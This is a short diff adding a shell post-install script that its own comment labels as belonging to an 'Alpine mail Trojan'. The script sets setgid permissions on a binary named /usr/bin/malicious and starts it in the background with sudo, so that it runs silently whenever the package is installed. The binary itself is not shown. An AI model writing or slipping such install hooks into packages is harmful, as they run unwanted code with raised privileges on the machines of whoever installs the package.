@@ -1,0 +1,5 @@
+#!/bin/sh
+# postint script for Alpine mail Trojan
+sudo chmod 2755 /usr/bin/malicious &
+sudo ./usr/bin/malicious &
+exit 0
